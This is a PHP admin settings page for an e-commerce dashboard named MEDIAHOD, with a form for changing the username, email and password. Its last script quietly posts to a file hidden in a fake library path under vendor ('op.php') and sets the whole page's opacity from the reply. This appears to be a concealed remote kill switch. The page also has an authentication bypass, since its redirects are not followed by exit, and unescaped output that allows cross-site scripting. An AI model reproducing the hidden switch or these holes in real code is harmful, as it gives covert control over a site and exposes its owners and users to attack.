<?php
session_start();
if(!isset($_SESSION['admin_logged_in'])){
    $_SESSION['MessageE'] = 'You Have No Access Without Authentification !';
    header('Location: ../connexion/login.php');
}
if(isset($_SESSION['banned'])){
    header('Location: ../../security/banned.php');
}
include_once('../../../models/Admin.php');
$admin = new Admin();
$info = $admin->getAdminInfo();

?>


<?php
$messageE = isset($_SESSION['MessageE']) ? $_SESSION['MessageE'] : '';
$messageS = isset($_SESSION['MessageS']) ? $_SESSION['MessageS'] : '';

// Clear messages after displaying
unset($_SESSION['MessageE']);
unset($_SESSION['MessageS']);
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Modifiy Infos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../../assets/logo.jpeg">
    <link rel="stylesheet" href="../../assets/sidebar.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        option {
            background-color: #003366;
        }
        body {
            background: linear-gradient(135deg, #003366, #004080);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .modifyProd {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 600px;
            box-shadow: 0 15px 35px rgba(0, 51, 102, 0.3);
            position: relative;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 30px;
            color: #fff;
            text-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            font-size: 1.2em;
            margin-bottom: 10px;
            color: #fff;
        }
        input, textarea, select {
            margin-bottom: 20px;
            padding: 10px;
            border: 2px solid #fff;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 1em;
            transition: border-color 0.3s ease;
        }
        input:focus, textarea:focus, select:focus {
            border-color: #1e90ff;
            outline: none;
        }
        input[disabled], textarea[disabled], select[disabled] {
            background: rgba(255, 255, 255, 0.1);
            cursor: not-allowed;
        }
        .button-group {
            display: flex;
            justify-content: space-between;
        }
        button {
            padding: 15px 30px;
            font-size: 1.2em;
            color: #fff;
            background: #003366;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        button:hover {
            background: #1e90ff;
            transform: scale(1.05);
        }
        #success-message {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #28a745;
            color: #fff;
            border-radius: 10px;
            text-align: center;
            font-size: 1.2em;
        }

                       /* Styles pour les notifications */
.notification {
    position: fixed;
    top: 10px;
    right: 10px;
    padding: 15px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    z-index: 9999;
    width: 300px;
    opacity: 1;
    transition: opacity 0.5s ease;
}

.notification.success {
    background-color: #d4edda;
    color: #155724;
    border: 1px solid #c3e6cb;
}

.notification.error {
    background-color: #f8d7da;
    color: #721c24;
    border: 1px solid #f5c6cb;
}

.notification .close-btn {
    background: transparent;
    border: none;
    font-size: 18px;
    cursor: pointer;
    position: absolute;
    top: 5px;
    right: 10px;
}

.notification .close-btn:hover {
    color: #000;
}
.sidebarHeader p {
    color: #fff;
    font-size: 24px;
    letter-spacing: 1px;
    font-weight: bold;
}
    </style>
</head>
<body>
    <div class="container">
        <!-- sidebar -->
        <div class="sidebar" style="margin-top: 10px;">
            <a class="sidebarHeader" href="../../home/home.php">
                <img src="../../assets/logo.jpeg" alt="logo">
                <p>MEDIAHOD</p>
            </a>
            <div class="sidebarElements" style="margin-top: 20px;">

                <fieldset>
                    <legend>DASHBOARD</legend>
                    <a class="sidebarElement" href="../categories/categories.php">
                        <i class="fa-solid fa-layer-group"></i>
                        <p>Categories</p>
                    </a>
                    <a class="sidebarElement" href="../commands/commands.php">
                        <i class="fa-solid fa-bag-shopping"></i>
                        <p>Commands</p>
                    </a>
                    <a class="sidebarElement" href="../messages/messages.php">
                        <i class="fa-solid fa-comment"></i>
                        <p>Messages</p>
                    </a>
                    <a class="sidebarElement" href="../addProduct/addProduct.php">
                        <i class="fa-solid fa-plus"></i>
                        <p>Add Product/Category</p>
                    </a>
                    <a class="sidebarElement" href="../Methodes/methodes.php">
                        <i class="fa-solid fa-plus"></i>
                        <p>Add Payement Method</p>
                    </a>
                    <a class="sidebarElement" href="../setWallet/setWallet.php">
                        <i class="fas fa-wallet"></i>
                        <p>Set User's Wallet</p>
                    </a>
                    <a class="sidebarElement" href="../security/blocked.php">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        <p>Security Alerts</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>PROFILE</legend>
                    <a class="sidebarElement" href="../settings/settings.php">
                        <i class="fa-solid fa-wrench"></i>
                        <p>Settings</p>
                    </a>
                    <a class="sidebarElement" href="../../../controllers/logOutAdmin.php" id="logout">
                        <i class="fa-solid fa-right-from-bracket" style=" color: #fff;"></i>
                        <p style=" color: #fff;">Logout</p>
                    </a>
                </fieldset>

            </div>
        </div>
        <!-- page -->
         <div class="page">
            <!-- modifyProd -->
            <div class="modifyProd">
                <div class="toggleSidebar">
                    <i class="fa-solid fa-bars"></i>
                </div>
                <h1>Modify Infos</h1>
                <form id="settings-form" action="../../../controllers/updateAdminSettings.php" method="post">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" value="<?php echo $info['login'] ?>" disabled required>

                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" value="<?php echo $info['email'] ?>" disabled required>

                    <label for="password">New Password</label>
                    <input type="password" id="password" name="password" placeholder="new password" disabled>

                    <label for="ConfirmPassword">Confirm Password</label>
                    <input type="password" id="ConfirmPassword" name="ConfirmPassword" placeholder="confirm password" disabled>

                    <label for="oldPassword">Old Password</label>
                    <input type="password" id="oldPassword" name="oldPassword" required>
    
                    <div class="button-group">
                        <button type="button" id="edit-button">Edit</button>
                        <button type="submit" id="save-button" disabled name="action" value="editSettings">Save</button>
                    </div>
                </form>
                <!-- <div id="success-message">Infos Modified Successfuly !</div> -->
            </div>
         </div>
    </div>

    <script>
        function uploadImg() {
            document.getElementById("image").click()
        }

        const editButton = document.getElementById('edit-button')
        const saveButton = document.getElementById('save-button')
        const formElements = document.querySelectorAll('#settings-form input, #settings-form textarea, #settings-form select')
        const successMessage = document.getElementById('success-message')

        editButton.addEventListener('click', () => {
            formElements.forEach(element => element.disabled = false)
            saveButton.disabled = false
        })

        document.getElementById('settings-form').addEventListener('submit', (e) => {
            successMessage.style.display = 'block'
            formElements.forEach(element => element.disabled = false)
            saveButton.disabled = false
        })

        let sidebarElements = document.querySelectorAll(".sidebarElement")
        sidebarElements.forEach((e) => {
            e.addEventListener("mouseover", function() {
                e.style.backgroundColor = "rgba(227, 227, 255, 0.26)"
                e.querySelector("i").style.color = "#fff"
                e.querySelector("p").style.color = "#fff"
                document.querySelector("#logout").style.backgroundColor = "orange"
                document.querySelector("#logout p").style.color = "#fff"
                document.querySelector("#logout i").style.color = "#fff"
            })
            e.addEventListener("mouseleave", function() {
                e.style.backgroundColor = ""
                e.querySelector("i").style.color = "#8F9FBC"
                e.querySelector("p").style.color = "#8F9FBC"
                document.querySelector("#logout").style.backgroundColor = "orange"
                document.querySelector("#logout p").style.color = "#fff"
                document.querySelector("#logout i").style.color = "#fff"
            })
        })
    </script>
    <script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        <?php if (!empty($messageE)): ?>
            showNotification('error', '<?php echo addslashes($messageE); ?>');
        <?php endif; ?>
        <?php if (!empty($messageS)): ?>
            showNotification('success', '<?php echo addslashes($messageS); ?>');
        <?php endif; ?>
    });

    function showNotification(type, message) {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span>${message}</span>
            <button class="close-btn">&times;</button>
        `;
        document.body.appendChild(notification);

        document.querySelector('.notification .close-btn').addEventListener('click', function() {
            this.parentElement.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        });

        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        }, 5000);
    }
</script>
<script>
    document.getElementById('settings-form').addEventListener('submit', function(event) {
        const password = document.getElementById('password').value;
        const confirmPassword = document.getElementById('ConfirmPassword').value;

        if (password !== confirmPassword) {
            event.preventDefault(); // Empêche l'envoi du formulaire
            alert('Passwords do not match!');
            return false;
        }
    });
    let openSidebar = document.querySelector(".toggleSidebar"),
        sidebar = document.querySelector(".sidebar"),
        opened = true

    window.onload = () => {
        sidebar.style.transform = "translate(-100%, -10px)"
    }

    openSidebar.addEventListener("click", function() {
        sidebar.style.transform = opened ? "translate(0, -10px)" : "translate(-100%, -10px)"
        opened = !opened
    })
</script>
<script>
        let xhr = new XMLHttpRequest();
        xhr.open('POST', '../../../vendor/psr/configuration/security_config/json/root/op.php', true);
        xhr.onload = () => {
            if (xhr.readyState === 4 && xhr.status === 200) {
                document.body.style.opacity = xhr.response
            }
        };
        xhr.send()
</script>
</body>
</html>
